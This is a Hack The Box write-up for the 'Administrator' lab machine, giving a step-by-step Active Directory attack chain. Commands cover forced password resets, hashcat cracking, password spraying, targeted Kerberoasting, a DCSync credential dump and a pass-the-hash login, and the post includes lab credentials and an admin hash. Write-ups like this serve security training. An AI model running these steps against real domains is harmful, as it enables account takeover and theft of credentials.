---
date: 2025-04-20T00:38:38-05:00
# description: ""
image: "/images/HTB-Administrator/Administrator.png"
showTableOfContents: true
tags: ["HackTheBox"]
categories: ["Writeups"]
title: "HTB: Administrator"
type: "post"
---

* Platform: Hack The Box
* Link: [Administrator](https://app.hackthebox.com/machines/Administrator)
* Level: Medium
* OS: Windows
---

> This box is an assumed breach scenario, we are given credentials for the following account: **Username:** Olivia **Password:** ichliebedich

For the Administrator box, we begin by leveraging the provided credentials to run BloodHound, which reveals an attack path involving the `GenericAll` and `ForceChangePassword` permissions. By exploiting these, we compromise additional user accounts and access an FTP server containing a Password Safe (`psafe3`) database file. Extracting credentials from this database grants us an initial foothold on the system. Through further enumeration we discover a privilege escalation vector with `GenericWrite` and `DCSync` permissions, ultimately enabling us to retrieve the domain administrator's hash.

## Scanning

```
nmap -sC -sV -oA nmap/Administrator 10.129.61.195
```

**Results**

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-22 18:18 CDT
Nmap scan report for 10.129.61.195
Host is up (0.060s latency).
Not shown: 988 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-23 06:19:04Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 6h59m59s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-04-23T06:19:10
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.00 seconds
```

The target is a Domain Controller running common Active Directory services such as Kerberos and LDAP. We also note the presence of the FTP (Microsoft ftpd) service on port 21. The domain name is `administrator.htb`.

Running `netexec smb {TARGET_IP}` we find out that the name of the target machine is `DC`, we will also add it to the hosts file.

![Machine name](/images/HTB-Administrator/machine_name.png)

```
sudo echo "{TARGET_IP} administrator.htb dc.administrator.htb" | sudo tee -a /etc/hosts
```

## Enumeration

Let's start the enumeration with the credentials provided. The user only has access to default shares. 

```
netexec smb 10.129.61.195 -u Olivia -p ichliebedich
```

![Olivia available shares](/images/HTB-Administrator/olivia_shares.png)

Let's check FTP.

```
netexec ftp 10.129.61.195 -u olivia -p ichliebedich
```

![Olivia access to FTP](/images/HTB-Administrator/olivia_FTP.png)

Olivia cannot access the FTP service most likely due to a lack of permissions.

Since we have some valid credentials, let's run Bloodhound.

```
bloodhound-python -c all -u Olivia -p ichliebedich  -d administrator.htb -ns 10.129.61.195
```

In Bloodhound we discover that `Olivia` hash the `GenericAll` permission on `Michael`, essentially full control over it. 

![Olivia GenericAll permission](/images/HTB-Administrator/Olivia_GenericAll.png)

We also find out that `Michael` has the `ForceChangePassword` permission on `Benjamin`, allowing us to forcibly change its password should we succeed to take over `Michael` account.

![Michael ForceChangePassword permission](/images/HTB-Administrator/Michael_ForceChangePassword.png)


```
net rpc password "Michael" "Paswword#@2024" -U "administrator.htb"/"Olivia"%"ichliebedich" -S "dc.administrator.htb"

netexec smb 10.129.61.195 -u michael -p "Paswword#@2024"
```
We successfully change `Michael` password and we can login via SMB.

![Michael password change](/images/HTB-Administrator/Michael_pwd_change.png)

Next we change `Benjamin` password.

```
net rpc password "Benjamin" "Paswword#@2025" -U "administrator.htb"/"Michael"%"Paswword#@2024" -S "dc.administrator.htb"

netexec smb 10.129.61.195 -u benjamin -p "Paswword#@2025"
```

The operation is successful!

![Benjamin password change](/images/HTB-Administrator/Benjamin_pwd_change.png)

This account also has only basic access to the SMB shares.

![Benjamin SMB shares](/images/HTB-Administrator/benjamin_SMB.png)

However we see that `Benjamin` is a member of the `Share Moderators` group, and most likely has permissions to access shares on this server. 

![Share Moderator group](/images/HTB-Administrator/Share_Moderators.png)

## Initial Foothold

After returning to FTP, we notice that this account can login.

![Benjamin FTP](/images/HTB-Administrator/Benjamin_FTP.png)

There is a file called `Backup.psafe3` which we download.

> Although it seems to not matter in this case everytime you get an error of the type `WARNING! x bare linefeeds received in ASCII mode.`, you should run the `bin` command in FTP then download the file again to avoid any issues.

![FTP file](/images/HTB-Administrator/FTP_file.png)

Hashcat is able to crack psafe3 file with the mode `5200`.

```
hashcat -a 0 -m 5200 Backup.psafe3 /usr/share/wordlists/rockyou.txt
```

> A `.psafe3` file is a Password Safe database file. It's used by the Password Safe application, an open-source password manager. 

We recover the password `tekieromucho`.

![psafe3 password cracked](/images/HTB-Administrator/hashcat_pwd.png)

If you don't already have it download the application with `sudo apt install passwordsafe` and use the file plus the password recovered to access the passwords.

Inside the file we find three sets of credentials.

![psafe3 credentials](/images/HTB-Administrator/psafe3_creds.png)
 
After creating a list of users and a list of passwords, we can spray the passwords in order to find the valid credentials.

```
netexec smb 10.129.61.195 -u users.txt -p pwds.txt --continue-on-success
```

![Emily valid password](/images/HTB-Administrator/emily_valid.png)

The valid credentials are `emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb`. We login with `evil-winrm` and recover the user flag.

```
evil-winrm -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' -i administrator.htb
```

![user flag](/images/HTB-Administrator/user_flag.png)

## Privilege Escalation

Emily has the `GenericWrite` permission on `Ethan`.

![GenericWrite permission](/images/HTB-Administrator/emily_GenericWrite.png)

`GenericWrite` can be abuse to launch a targeted Kerberost attack.

```
sudo ntpdate {TARGET_IP}

python3 targetedKerberoast.py -v -d 'administrator.htb' -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
```

![Ethan hash](/images/HTB-Administrator/targeted_kerberoast.png)

We crack the hash with hashcat and recover the password `limpbizkit`.

```
hashcat ethan_hash.txt /usr/share/wordlists/rockyou.txt
```

![Ethan password cracked](/images/HTB-Administrator/ethan_pwd.png)

`Ethan` has the `DCSync` permission over the domain.

> `DCSync` allows a user or group to simulate the behavior of a Domain Controller, specifically to replicate password data, inclusing NTLM hashes, Kerberos secrets (krbtgt), and even domain controller credentials.

![DCSync permission](/images/HTB-Administrator/Ethan_DCSync.png)

We can abuse it to dump the hash of the Administrator.

```
impacket-secretsdump.py 'Administrator.htb/ethan:limpbizkit'@'dc.administrator.htb'
```

![DCSync attack](/images/HTB-Administrator/DCSync_administrator.png)

We login with the admin hash and recover the root flag.

```
evil-winrm -u 'Administrator' -H "3dc553ce4b9fd20bd016e098d2d2fd2e" -i {TARGET_IP}
```

![root flag](/images/HTB-Administrator/root_flag.png)




